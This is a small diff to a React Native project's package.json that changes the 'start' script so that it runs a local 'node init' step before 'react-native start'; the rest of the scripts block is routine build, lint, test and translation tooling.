@@ -6,7 +6,7 @@
     "android": "react-native run-android",
     "ios": "react-native run-ios",
     "lint": "eslint .",
-    "start": "react-native start",
+    "start": "node init && react-native start",
     "test": "jest",
     "i18n": "node scripts/i18n-extract.mjs && node scripts/i18n-translate.mjs",
     "icons": "python scripts/generate-icons.py"
